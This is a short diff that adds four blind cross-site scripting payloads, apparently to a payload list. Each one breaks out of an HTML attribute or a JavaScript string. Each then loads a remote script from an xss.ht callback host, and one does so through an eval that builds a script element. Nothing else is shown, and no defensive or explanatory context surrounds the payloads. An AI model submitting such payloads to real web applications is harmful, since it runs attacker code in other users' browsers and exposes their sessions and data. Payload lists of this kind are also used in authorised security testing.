@@ -1,0 +1,4 @@
+"><script src=https://username.xss.ht></script>
+'><script src=https://username.xss.ht></script>
+";eval('var a=document.createElement(\'script\');a.src=\'https://username.xss.ht\';document.body.appendChild(a)')
+"><script src=https://username.xss.ht></script>
